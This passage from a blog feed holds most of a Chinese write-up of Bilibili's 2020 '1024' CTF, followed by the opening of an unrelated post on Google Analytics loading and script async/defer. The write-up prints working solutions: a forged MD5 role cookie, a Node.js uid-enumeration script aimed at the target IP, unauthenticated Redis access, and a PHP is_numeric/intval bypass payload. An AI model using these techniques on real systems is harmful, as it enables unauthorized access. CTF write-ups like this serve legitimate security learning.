class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 